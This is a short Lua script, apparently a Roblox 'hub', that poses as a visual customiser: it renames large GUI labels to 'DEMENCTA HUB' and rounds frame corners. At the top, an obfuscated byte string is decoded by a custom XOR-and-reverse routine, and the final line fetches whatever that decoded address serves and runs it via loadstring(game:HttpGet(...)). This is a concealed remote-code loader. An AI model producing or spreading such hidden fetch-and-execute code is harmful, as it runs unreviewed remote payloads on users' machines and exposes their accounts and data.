
--[[ STAGE 2: VISUAL CORE ]]
local VB4NktseuMSoP9OhBV5OWA="\109\002\006\065\113\127\008\008\050\059\023\016\035\214\213\193\201\200\209\206\056\039\043\045\222\155\237\149\141\229\153\140\187\189\175\143\187\150\161\070\094\091\067\117\077\117\069\114\075\115\101\026\006\030\012\004\000\063\039\024\051\038\213\032\041\221\223\045\219\252\203\221\039\227\227\228\149\220\154\135\157\176\137\138\177\163\188\234\160\092\092\084\069\070\075\064\126\120\100\174\109\020\109\093\000\003\007\051\050\060\053\033\057\212\223\045\197\221\202\192\207\051\229\244\238\044\041\217\155\153\142\139\128"local x7kpR3Z08OtdGFlQ3=86 local rnDal19lMIfGy_B9=184 local v1pJL7K1VKr7I=1 local fQTSx9tvmODEy8=5 local ZhSmvYxNwJZhWHEkHXw=29 local sI8YsLLIB2eEOfLuNydn=true local XtJbNmcmX25Ru=bit32 and bit32.bxor if not XtJbNmcmX25Ru then XtJbNmcmX25Ru=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local XqOsAHXj1cXO={}for OCnH0VzYNB8DM2V8fwxCf=1,#VB4NktseuMSoP9OhBV5OWA do local ROj7WF9MycdDbvFp9W2M=string.byte(VB4NktseuMSoP9OhBV5OWA,OCnH0VzYNB8DM2V8fwxCf)local cumojQNpHBNY0MYJQk0RHt=(rnDal19lMIfGy_B9+(OCnH0VzYNB8DM2V8fwxCf*fQTSx9tvmODEy8)+ZhSmvYxNwJZhWHEkHXw)%256 if v1pJL7K1VKr7I==0 then ROj7WF9MycdDbvFp9W2M=(ROj7WF9MycdDbvFp9W2M-cumojQNpHBNY0MYJQk0RHt)%256 XqOsAHXj1cXO[OCnH0VzYNB8DM2V8fwxCf]=string.char(XtJbNmcmX25Ru(ROj7WF9MycdDbvFp9W2M,x7kpR3Z08OtdGFlQ3))else ROj7WF9MycdDbvFp9W2M=XtJbNmcmX25Ru(ROj7WF9MycdDbvFp9W2M,x7kpR3Z08OtdGFlQ3)XqOsAHXj1cXO[OCnH0VzYNB8DM2V8fwxCf]=string.char((ROj7WF9MycdDbvFp9W2M-cumojQNpHBNY0MYJQk0RHt)%256)end end local kyIAZT4RrmF_T_uMEkDAGS=table.concat(XqOsAHXj1cXO)if sI8YsLLIB2eEOfLuNydn then kyIAZT4RrmF_T_uMEkDAGS=string.reverse(kyIAZT4RrmF_T_uMEkDAGS)end local UoaAHZKM8ywRfH3kxxRu=kyIAZT4RrmF_T_uMEkDAGS
local HubName = "DEMENCTA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(UoaAHZKM8ywRfH3kxxRu))()
